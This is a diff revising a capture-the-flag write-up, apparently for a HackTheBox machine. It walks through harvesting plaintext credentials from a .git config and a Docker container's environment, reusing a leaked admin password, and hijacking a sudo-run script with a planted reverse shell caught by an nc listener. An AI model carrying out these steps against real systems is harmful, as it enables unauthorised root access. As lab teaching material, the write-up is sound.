@@ -180,7 +180,7 @@ drwxr-xr-x 9 www-data www-data 4096 Dec  1 14:35 objects
 drwxr-xr-x 5 www-data www-data 4096 Dec  1 14:35 refs
 ```
 
-We know that the user administrator@gitea.searcher.htb exists:
+From the logs, we know that the user administrator@gitea.searcher.htb exists:
 ```
 svc@busqueda:/var/www/app/.git$ cd logs
 
@@ -195,7 +195,7 @@ svc@busqueda:/var/www/app/.git/logs$ cat HEAD
 0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000 commit (initial): Initial commit
 ```
 
-There are also credentials in clear text for the user cody:
+From the config file, there is also clear text credential for the user cody:
 ```
 svc@busqueda:/var/www/app/.git$ cat config
 
@@ -212,7 +212,7 @@ svc@busqueda:/var/www/app/.git$ cat config
         merge = refs/heads/main
 ```
 
-There is a local Gitea instance installed on the system. Adding local DNS entry on the attacker machine to make sure we can resolve the subdomain correctly:
+There is most likely a local Gitea instance installed on the system. Adding local DNS entry on the attacker machine to make sure we can resolve the subdomain correctly:
 ```
 vim /etc/hosts
 
@@ -246,7 +246,7 @@ User svc may run the following commands on busqueda:
     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-The script is not readable but the usage is displayed when executed, we can specify one of the available actions as well as arguments:
+The system-checkup.py script is not readable, but the usage is displayed when executed:
 ```
 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py id
 < /usr/bin/python3 /opt/scripts/system-checkup.py id
@@ -257,7 +257,7 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
      full-checkup  : Run a full system checkup
 ```
 
-Testing the various actions:
+Testing the behavior of the three actions:
 ```
 svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
 
@@ -274,23 +274,27 @@ svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checku
 Something went wrong
 ```
 
-The first options lists the current state of the containers.
+The first option lists the current state of the containers.
+
+The second option queries attributes of the container's configuration.
 
 The third option failed without any verbose output.
 
-Checking the documentation for the docker-inspect option:
+Checking the documentation for the docker-inspect (second option):
 https://docs.docker.com/engine/reference/commandline/inspect/
 
-We are able to dump the configuration data of the container, which contains clear text credentials:
+We can dump the configuration data of the container, which contains clear text credentials:
 ```
 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
 <-checkup.py docker-inspect '{{json .Config}}' gitea
 {"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
 ```
 
-We are able to login as administrator on Gitea with the leaked password (yuiu1hoiu4i5ho1uh). We now have visibiliy on specific commits regarding the administrative scripts located in /opt/scripts.
+We are able to login as administrator on Gitea with the leaked password (yuiu1hoiu4i5ho1uh). 
 
-The content of the system-checkup.py is viewable:
+We now have visibility on specific commits regarding the administrative scripts located in /opt/scripts.
+
+The content of the system-checkup.py is now viewable:
 ```python
 import subprocess
 import sys
@@ -369,7 +373,6 @@ The first two options will launch native docker commands built from an argument 
 The third option is failing since it is trying to launch the full-checkup.sh script in the current directory while the actual file is stored in /opt/scripts. 
 
 It means that we can craft a malicious reverse shell script and execute it instead of the legitimate one:
-
 ```
 vim full-checkup.sh
 
@@ -380,13 +383,16 @@ chmod +x full-checkup.sh
 ```
 
 Starting the listener on the attacker machine:
-
 ```
 nc -nlvp 12345
 ```
 
-The malicious bash script is executed as root:
+Launching the script with root privileges:
+```
+svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
 
+The reverse shell script gets executed with elevated privileges:
 ```
 connect to [10.10.14.44] from (UNKNOWN) [10.10.11.208] 45454
 whoami
